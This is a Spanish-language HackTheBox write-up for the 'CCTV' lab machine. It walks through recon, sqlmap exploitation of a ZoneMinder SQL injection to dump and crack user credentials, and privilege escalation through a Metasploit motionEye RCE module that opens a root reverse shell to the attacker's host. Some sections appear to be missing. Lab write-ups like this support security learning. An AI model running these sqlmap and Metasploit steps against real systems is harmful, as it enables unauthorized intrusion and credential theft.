# HTB - CCTV Writeup

**IP:** `10.129.16.216`  
**Dificultad:** Easy  
**OS:** Linux (Ubuntu)

---

## 1. Reconocimiento

### Escaneo de puertos

Al recibir la IP de la máquina, se realiza un escaneo con Nmap para identificar puertos abiertos:

```bash
nmap -sC -sV 10.129.16.216
```

Se encuentran dos puertos abiertos:

- **22** — SSH
- **80** — HTTP

### Descubrimiento de vhost

Al intentar acceder al puerto 80 directamente por IP en el navegador, la página no carga. Esto indica que el servidor usa virtual hosting. Se agrega la IP y el dominio al archivo `/etc/hosts`:

```bash
echo "10.129.16.216 cctv.htb" | sudo tee -a /etc/hosts
```

Accediendo a `http://cctv.htb` la página carga correctamente.

### Fuzzing de directorios y subdominios

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://cctv.htb/FUZZ -fc 404

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://cctv.htb -H "Host: FUZZ.cctv.htb" -fc 302,404
```

No se encuentran resultados relevantes.

## 3. Explotación — SQL Injection (CVE-2024-51428)

### Identificación de la vulnerabilidad

ZoneMinder 1.37.63 es vulnerable a SQL Injection autenticada en el parámetro `tid` del endpoint `removetag`. Se obtiene la cookie de sesión `ZMSESSID` desde el navegador (F12 → Application → Cookies) y se confirma la inyección con sqlmap:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" \
  -p tid --dbms=mysql --batch
```

sqlmap confirma inyección **time-based blind** en MySQL >= 8.0.0.

### Extracción de credenciales

Se dumpean los usuarios y contraseñas de la tabla `Users` en la base de datos `zm`:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" \
  -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
```

Se obtienen tres usuarios. El hash de `mark` corresponde a un bcrypt crackeable.

### Crackeo del hash

Se descomprime el wordlist y se crackea el hash con John the Ripper:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz

echo '$2y$10$<hash_de_mark>' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

**Resultado:** `mark:opensesame`

## 5. Enumeración interna

### Puertos internos

Desde la sesión SSH se enumeran los servicios corriendo localmente:

```bash
ss -tlnp
```

Se identifican varios puertos internos relevantes:

- `8765` — motionEye
- `7999` — Motion daemon
- `8554`, `9081`, `8888`, `1935` — servicios adicionales
- `3306` — MySQL

Se verifica el servicio en el puerto 7999:

```bash
curl http://127.0.0.1:7999
# Motion 4.7.1 Running [1] Camera 1
```

Y en el puerto 8765 se confirma **motionEye**.

### Credenciales de motionEye

Se busca la contraseña del admin de motionEye en los archivos de configuración:

```bash
cat /etc/motioneye/motion.conf
```

Se obtiene el hash del admin:


## 6. Escalada de privilegios — motionEye RCE (CVE-2025-60787)

motionEye <= 0.43.1b4 es vulnerable a RCE autenticado. Se hace port forwarding para exponer el servicio localmente en Kali:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.16.216
```

Se carga el módulo de Metasploit correspondiente y se configuran las opciones:

```bash
use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
set RHOSTS 127.0.0.1
set RPORT 8765
set USERNAME admin
set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
set LHOST 10.10.14.252
set LPORT 4444
run
```

El exploit agrega una cámara maliciosa, inyecta el payload y abre una sesión Meterpreter como **root**.

```
[+] Meterpreter session 1 opened (10.10.14.252:4444 -> 10.129.16.216:59942)
```
